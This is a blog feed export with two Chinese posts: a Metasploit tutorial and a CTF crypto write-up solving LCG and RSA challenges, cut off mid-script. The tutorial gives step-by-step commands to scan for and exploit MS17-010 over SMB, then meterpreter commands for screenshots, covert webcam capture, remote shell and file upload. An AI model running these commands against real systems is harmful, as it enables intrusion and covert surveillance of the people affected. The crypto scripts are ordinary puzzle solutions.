        <content type="html"><![CDATA[<p>简称MSF，高度模块儿化，框架由多个module组成。</p><p>它是一款开源安全漏洞利用和测试工具，集成了各种平台上常见的溢出漏洞和流行的shellcode，并持续保持更新。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><pre class="line-numbers language-none"><code class="language-none">&#x2F;usr&#x2F;share&#x2F;metasploit-framework<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">data:包含metasploit用于存储某些漏洞、单词列表、图像等所需二进制文件的可编辑文件documentation:包含框架可用的框架lib：metasploit的库文件夹plugins:用来存放metasploit的插件scripts:用来存放metasploit的脚本，包括meterpreter及其脚本tools:存放多种命令行实用程序modules:存储metasploit的模块文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>modules目录</p><pre class="line-numbers language-none"><code class="language-none">auxiliary：辅助模块，辅助渗透（端口扫描、登录密码爆破、漏洞验证）encoders ：编码器模块，主要包含各种编码工具，对payload进行编码加密，以便绕过入侵检测和过滤系统evasion ：躲避模块，用来生成免杀的payloadexploits：漏洞模块，包含主流的漏洞利用脚本，通常是对某些可能存在漏洞的目标进行漏洞利用。命名规则：操作系统&#x2F;各种应用协议分类nops：由于IDS&#x2F;IPS会检查数据包中国不规则的数据，在某些情况下，比如针对溢出攻击，某些特殊滑行字符串会因为被拦截而导致攻击失效payloads：攻击载荷，主要是攻击成功后在目标及其执行的代码，比如反弹shell的代码post：后渗透阶段模块，漏洞利用成功获得meterpreter之后，向目标发送的一些功能性指令，如：提权等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="metasploit简单命令"><a href="#metasploit简单命令" class="headerlink" title="metasploit简单命令"></a>metasploit简单命令</h2><pre class="line-numbers language-metasploit" data-language="metasploit"><code class="language-metasploit">msfdb init:初始化数据库msfconsole:启动db_status:查看是否连接到数据库workspace:查看工作区workspace -h:查看帮助命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="metasploit-信息收集"><a href="#metasploit-信息收集" class="headerlink" title="metasploit-信息收集"></a>metasploit-信息收集</h2><pre class="line-numbers language-none"><code class="language-none">db_nmap:nmap扫描-PA：TCP ACK PING扫描-PS: TCP SYN PING扫描-PR: ARP扫描是nmap对目标进行一个arp ping扫描的过程，尤其是在内网的情况下。因为防火墙不会禁止ARP请求hosts:当前工作区的所有主机-T[0-5]：默认是T3,T4表示最大TCP扫描延迟位10ms-sS:TCP SYN扫描-sA:TCP ACK扫描-sT：TCP扫描-A ：打开操作系统探测和版本探测<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="利用模块进行扫描"><a href="#利用模块进行扫描" class="headerlink" title="利用模块进行扫描"></a>利用模块进行扫描</h2><pre class="line-numbers language-none"><code class="language-none">端口扫描use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;模式use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;syn 半开扫描以use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;syn 扫描为例可以通过使用search portscan 进行查看都有什么方式show options    查看都有什么选项set rhost ip地址set threads 设置线程使用run或者exploit进行跑<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">c段扫描use auxiliary&#x2F;scanner&#x2F;discovery按TAB键显示都有什么选项常用的是arp_sweepuse auxiliary&#x2F;scanner&#x2F;discovery&#x2F;arp_sweep然后设置目标主机set rhosts 192.168.123.0&#x2F;24然后设置线程什么的run就可以扫C段了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="msf常用命令"><a href="#msf常用命令" class="headerlink" title="msf常用命令"></a>msf常用命令</h2><pre class="line-numbers language-none"><code class="language-none">show exploits:查看所有可用的渗透攻击程序代码show auxiliary：查看所有可用的辅助攻击工具show options&#x2F;advanced：查看该模块的可用选项show targets：查看该模块适用的攻击目标类型search：根据关键字搜索某模块info：显示模块的详细内容use：使用某个模块back：回退set&#x2F;unset：设置&#x2F;禁止模块中的某个参数setg&#x2F;usetg：设置&#x2F;禁用适用于所有模块的全局参数      save：将当前的设置保存下来，以便下次启动MSF终端时仍可以使用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="msf攻击获取meterpreter"><a href="#msf攻击获取meterpreter" class="headerlink" title="msf攻击获取meterpreter"></a>msf攻击获取meterpreter</h2><p>ms17_010</p><pre class="line-numbers language-none"><code class="language-none">search ms17_010<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/06/09/metasploit%E6%A1%86%E6%9E%B6/image-20230517002626452.png" alt="image-20230517002626452"></p><p>两个攻击模块两个检测模块</p><pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010然后show options<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2023/06/09/metasploit%E6%A1%86%E6%9E%B6/image-20230517002935053.png" alt="image-20230517002935053"></p><pre class="line-numbers language-none"><code class="language-none">设置目标机器的地址set rhosts ip地址（可以使用网段）run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如果存在漏洞的话就可以利用攻击脚本</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec 设置目标IP地址set rhosts IP地址run然后就进去了meterpreter然后输入 ？ 回车  会显示操作命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">这里如果拿到的不是meterpreter那么可以进行转化background  进入后台sessions然后输入 sessions 1进行转换<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="meterpreter的利用"><a href="#meterpreter的利用" class="headerlink" title="meterpreter的利用"></a>meterpreter的利用</h2><pre class="line-numbers language-none"><code class="language-none">输入 ?  查看功能<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里我随便写几个功能</p><pre class="line-numbers language-none"><code class="language-none">screenshot   截屏webcam_list  查看摄像头webcam_snap  通过摄像头拍照webcam_stream 通过摄像头开启视频shell        可以进入目标机器的命令行execute -H -i -f cmd.exeupload       上传文件  upload &#x2F;exp.py C:\\exp.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> cs和msf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023陕西省网络安全技能大赛</title>
      <link href="/2023/06/09/2023%E9%99%95%E8%A5%BF%E7%9C%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/"/>
      <url>/2023/06/09/2023%E9%99%95%E8%A5%BF%E7%9C%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="奇怪的sar"><a href="#奇怪的sar" class="headerlink" title="奇怪的sar"></a>奇怪的sar</h2><p>首先就是一个lcg，求出seed，seed就是p,q异或的值，还已知n&#x3D;p<em>q,然后找一个已知seed&#x3D;p^q,n&#x3D;p</em>q的脚本分解n，然后RSA得flag</p><p>lcg</p><p><a href="https://blog.csdn.net/superprintf/article/details/108964563%E4%B8%80%E5%A0%86LCG%E7%9A%84%E8%84%9A%E6%9C%AC">https://blog.csdn.net/superprintf/article/details/108964563一堆LCG的脚本</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#sage</span>n <span class="token operator">=</span>  <span class="token number">137670797028117726329534659376416493367957852768263083700434198723955223922183386928456013703791817601151754417828367188186912209697081337658512940425529211281290630976671911327606706953154608427885071841566358882014021242768190762103365969320014710368160869517966437591299370072284930202718943785099916898209</span>output <span class="token operator">=</span>  <span class="token punctuation">[</span><span class="token number">101737402423360536260958229788866250367716256968287178187558336481872788309727545478736771692477306412259739856568227009850831432381180909815512654609798228982433082928392936844193974517574281026029228179913579225687286945054175762659252515268270399329404664775893089132101252158524000295899895962104782878103</span><span class="token punctuation">,</span> <span class="token number">37355684997487259669354747104430314505839306993101096210478266975184357608742619438151118843905165289324251734149329596611854110739738607745107961453008343886403511257039401245484528985856920723694142989180291902939107642020398816995584650913417698279936585230648639613028793148102494100898288564799111024672</span><span class="token punctuation">,</span> <span class="token number">58677759595639211550435023449462812079890625834313820227189340593596480924226619376872336960357021314847975570175387751632125898437020801920862764666175594874885587518469384576361008639967382152477408865298759987606155830674598034578657554841283906976808719095766296677147076808250022898199866472085742989883</span><span class="token punctuation">,</span> <span class="token number">61841632061818470036288407041172200048676249787061823756736224887116113640875444187463656719652972233582538657844183320242896612625995507633237074900538692102956750184024574603018257213912795847625926653585010890014291951218199774765624860625726555381815237888483974246173727262881650634287497285246796321130</span><span class="token punctuation">,</span> <span class="token number">7618244158597756867387754433401378508070531356170836765779245254233413235386172690733378371343899289510629513166609513857423499004879497768588665836034791151090648182168421570449377835494883902907064269417199065924565304966242954268460876762295575715334403142360198583318323418975108290758222653083011275844</span><span class="token punctuation">,</span> <span class="token number">106276841058222138994123556391380518368163552919305398852484130331884811278068151915582752795463570013359693610495645946230044828403849434903415989487924763756589202218361370725532394478569304449884620166937809374355282324069422109879874964479199929174533104879048175102339134830614476339153367475243140156049</span><span class="token punctuation">,</span> <span class="token number">54574757236475194407137831004617398270525645136836468973535243574661043352422598443323384197261529289829451787586618886007968913414366545291507686451774653217577858375086817168124727394445167274831801876424578654786480330913650363551771258617533162477541882336257099777912519011890593910515860435759936717781</span><span class="token punctuation">,</span> <span class="token number">15567087904962670212229825713697043597876172881256160613623383896576159414077875401117959132252949501643234465895697270909085179587988268864498823765197994781747034644583869111599516151129007414228897958635533561248099927507725880289417298814703767549313482346652043188826434944367260731729064673486516315207</span><span class="token punctuation">,</span> <span class="token number">10757138067445225320504771816863593606847219020279502671965413470243269270456133564739090471033889069283122519782525412134604896073598293410977787230108853737796640474070194546344190858079847734817109910030714675258996740807873872365037296486121580542250452443305370358407408558223735250474249180772656905880</span><span class="token punctuation">,</span> <span class="token number">68097848963949068260912124852455363245291187860801223898468533992003737157497436432969031551088942445561676359631354280979357356539429863946694570097104716411407829017684705171462511875250672979623888463245258237680782731827727876526411531354910982579164963119481534453651300645314177478026462894232377307020</span><span class="token punctuation">]</span>MMI <span class="token operator">=</span> <span class="token keyword">lambda</span> A<span class="token punctuation">,</span> n<span class="token punctuation">,</span>s<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>t<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>N<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">:</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">2</span> <span class="token keyword">and</span> t<span class="token operator">%</span>N <span class="token keyword">or</span> MMI<span class="token punctuation">(</span>n<span class="token punctuation">,</span> A<span class="token operator">%</span>n<span class="token punctuation">,</span> t<span class="token punctuation">,</span> s<span class="token operator">-</span>A<span class="token operator">//</span>n<span class="token operator">*</span>t<span class="token punctuation">,</span> N <span class="token keyword">or</span> n<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span>n<span class="token operator">&lt;</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token comment">#逆元计算</span>a<span class="token operator">=</span><span class="token punctuation">(</span>output<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-</span>output<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span>MMI<span class="token punctuation">(</span><span class="token punctuation">(</span>output<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span>output<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">%</span>nani<span class="token operator">=</span>MMI<span class="token punctuation">(</span>a<span class="token punctuation">,</span>n<span class="token punctuation">)</span>b<span class="token operator">=</span><span class="token punctuation">(</span>output<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span>a<span class="token operator">*</span>output<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>nseed <span class="token operator">=</span> <span class="token punctuation">(</span>ani<span class="token operator">*</span><span class="token punctuation">(</span>output<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>n<span class="token keyword">print</span><span class="token punctuation">(</span>seed<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>求得seed</p><pre class="line-numbers language-none"><code class="language-none">39428646082513135314545544161912595458975375891528176714825766497155482031976852156313956476772023258684487799640179241987139554034654104867011313090105438798561154654679825702410748780286094326639330840289843154525176685892323447168072417654823748596238888125898914210332775882916911771786984574407163323116<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后在GitHub上找分解n的脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnum<span class="token keyword">import</span> math<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">check_cong</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> p<span class="token punctuation">,</span> q<span class="token punctuation">,</span> n<span class="token punctuation">,</span> xored<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    kmask <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> k<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>    p <span class="token operator">&amp;</span><span class="token operator">=</span> kmask    q <span class="token operator">&amp;</span><span class="token operator">=</span> kmask    n <span class="token operator">&amp;</span><span class="token operator">=</span> kmask    pqm <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">*</span>q<span class="token punctuation">)</span> <span class="token operator">&amp;</span> kmask    <span class="token keyword">return</span> pqm <span class="token operator">==</span> n <span class="token keyword">and</span> <span class="token punctuation">(</span>xored <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> <span class="token punctuation">(</span>p<span class="token operator">^</span>q<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span>xored <span class="token operator">&amp;</span> kmask<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">extend</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">:</span>    kbit <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>k<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span> a <span class="token operator">&lt;</span> kbit    <span class="token keyword">yield</span> a    <span class="token keyword">yield</span> a <span class="token operator">|</span> kbit<span class="token keyword">def</span> <span class="token function">factor</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> p_xor_q<span class="token punctuation">)</span><span class="token punctuation">:</span>    tracked <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">)</span> <span class="token keyword">for</span> p <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">for</span> q <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span>                   <span class="token keyword">if</span> check_cong<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p<span class="token punctuation">,</span> q<span class="token punctuation">,</span> n<span class="token punctuation">,</span> p_xor_q<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    PRIME_BITS <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>ceil<span class="token punctuation">(</span>math<span class="token punctuation">.</span>log<span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    maxtracked <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tracked<span class="token punctuation">)</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> PRIME_BITS<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        newset <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> tp<span class="token punctuation">,</span> tq <span class="token keyword">in</span> tracked<span class="token punctuation">:</span>            <span class="token keyword">for</span> newp_ <span class="token keyword">in</span> extend<span class="token punctuation">(</span>k<span class="token punctuation">,</span> tp<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> newq_ <span class="token keyword">in</span> extend<span class="token punctuation">(</span>k<span class="token punctuation">,</span> tq<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token comment"># Remove symmetry</span>                    newp<span class="token punctuation">,</span> newq <span class="token operator">=</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span><span class="token punctuation">[</span>newp_<span class="token punctuation">,</span> newq_<span class="token punctuation">]</span><span class="token punctuation">)</span>                    <span class="token keyword">if</span> check_cong<span class="token punctuation">(</span>k<span class="token punctuation">,</span> newp<span class="token punctuation">,</span> newq<span class="token punctuation">,</span> n<span class="token punctuation">,</span> p_xor_q<span class="token punctuation">)</span><span class="token punctuation">:</span>                        newset<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token punctuation">(</span>newp<span class="token punctuation">,</span> newq<span class="token punctuation">)</span><span class="token punctuation">)</span>        tracked <span class="token operator">=</span> newset        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tracked<span class="token punctuation">)</span> <span class="token operator">></span> maxtracked<span class="token punctuation">:</span>            maxtracked <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tracked<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Tracked set size: &#123;&#125; (max=&#123;&#125;)'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>tracked<span class="token punctuation">)</span><span class="token punctuation">,</span> maxtracked<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># go through the tracked set and pick the correct (p, q)</span>    <span class="token keyword">for</span> p<span class="token punctuation">,</span> q <span class="token keyword">in</span> tracked<span class="token punctuation">:</span>        <span class="token keyword">if</span> p <span class="token operator">!=</span> <span class="token number">1</span> <span class="token keyword">and</span> p<span class="token operator">*</span>q <span class="token operator">==</span> n<span class="token punctuation">:</span>            <span class="token keyword">return</span> p<span class="token punctuation">,</span> q    <span class="token keyword">assert</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'factors were not in tracked set. Is your p^q correct?'</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> <span class="token number">24044063028844014127418595700558729326190738802687551098858513077613750188240082663594575453404975706225242363463089392757425008423696150244560748490108425645064339883915929498539109384801415313004805586193044292137299902797522618277016789979196782551492020031695781792205215671106103568559626617762521687128199445018651010056934305055040748892733145467040663073395258760159451903432330506383025685265502086582538667772105057401245864822281535425692919273252955571196166824113519446568745718898654447958192533288063735350717599092500158028352667339959012630051251024677881674246253876293205648190626145653304572328397</span>    seed <span class="token operator">=</span> <span class="token number">39428646082513135314545544161912595458975375891528176714825766497155482031976852156313956476772023258684487799640179241987139554034654104867011313090105438798561154654679825702410748780286094326639330840289843154525176685892323447168072417654823748596238888125898914210332775882916911771786984574407163323116</span>    c <span class="token operator">=</span> <span class="token number">14883053247652228283811442762780942186987432684268901119544211089991663825267989728286381980568977804079766160707988623895155236079459150322336701772385709429870215701045797411519212730389048862111088898917402253368572002593328131895422933030329446097639972123501482601377059155708292321789694103528266681104521268192526745361895856566384239849048923482217529011549596939269967690907738755747213669693953769070736092857407573675987242774763239531688324956444305397953424851627349331117467417542814921554060612622936755420459029769026126293588814831034143264949347763031994934813475762839410192390466491651507733968227</span>    p<span class="token punctuation">,</span> q <span class="token operator">=</span> factor<span class="token punctuation">(</span>n<span class="token punctuation">,</span> seed<span class="token punctuation">)</span>    phi<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span>    d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span><span class="token number">65537</span><span class="token punctuation">,</span>phi<span class="token punctuation">)</span>    m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>p<span class="token operator">*</span>q<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到flag</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;y0u_kn0w_Pruning_and_lcg&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="HaM3"><a href="#HaM3" class="headerlink" title="HaM3"></a>HaM3</h2><p>这种题目已经遇到过好多次，这里有一个十分相似的题</p><p><a href="https://blog.cryptohack.org/cryptoctf2021-easy#hamul">https://blog.cryptohack.org/cryptoctf2021-easy#hamul</a></p><p>但是这里需要爆破三位</p><p>exp1</p><p>这个exp是按照<a href="https://blog.cryptohack.org/cryptoctf2021-easy#hamul%E8%BF%99%E4%B8%AA%E5%86%99%E7%9A%84%EF%BC%8C%E9%80%9F%E5%BA%A6%E5%8D%81%E5%88%86%E7%9A%84%E5%BF%AB">https://blog.cryptohack.org/cryptoctf2021-easy#hamul这个写的，速度十分的快</a></p><pre class="line-numbers language-PYTHON" data-language="PYTHON"><code class="language-PYTHON">from Crypto.Util.number import *n &#x3D; 142672086626283587048017713116658568907056287246536918432205313755474498483915485435443731126588499776739329317569276048159601495493064346081295993762052633c &#x3D; 35771468551700967499031290145813826705314774357494021918317304230766070868171631520643911378972522363861624359732252684003796428570328730483253546904382041low &#x3D; str(n)[-18:]high &#x3D; str(n)[:18]pq_prob &#x3D; []for i in range(10):  #爆破    for j in range(10):        for p in range(10):            pq_prob.append(int(high + str(i) + str(j)+ str(p)+low))for x in pq_prob:    f &#x3D; factor(int(x))    if (len(f) &#x3D;&#x3D; 2 and f[0][0].nbits() &#x3D;&#x3D; 64) :        p, q &#x3D; f[0][0], f[1][0]        breakP &#x3D; int(str(p) + str(q))Q &#x3D; int(str(q) + str(p))PP &#x3D; int(str(P) + str(Q))QQ &#x3D; int(str(Q) + str(P))N &#x3D; PP * QQprint(PP)print(QQ)phi &#x3D; (PP-1) * (QQ-1)e&#x3D;65537d &#x3D; inverse(e, phi)m &#x3D; pow(c, d,PP*QQ)print(N &#x3D;&#x3D; n)print(long_to_bytes(int(m)))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp2</p><p>这个exp是我自己存的这个类型的脚本，但是跑出来的速度慢一点</p><p>主要是因为这个脚本每次都要判断x是否能分解，能分解的话还判断是否正确，所以有点慢</p><p>上面那个脚本是首先把所有结果存到一个列表里然后进行分解判断，所以速度较快</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>n <span class="token operator">=</span> <span class="token number">142672086626283587048017713116658568907056287246536918432205313755474498483915485435443731126588499776739329317569276048159601495493064346081295993762052633</span>c <span class="token operator">=</span> <span class="token number">35771468551700967499031290145813826705314774357494021918317304230766070868171631520643911378972522363861624359732252684003796428570328730483253546904382041</span>low <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">18</span><span class="token punctuation">:</span><span class="token punctuation">]</span>high <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">#爆破</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> p <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            x<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>high <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token operator">+</span>low<span class="token punctuation">)</span>            f <span class="token operator">=</span> factor<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token keyword">and</span> f<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>                p<span class="token punctuation">,</span> q <span class="token operator">=</span> f<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> f<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>                P <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span>                Q <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token 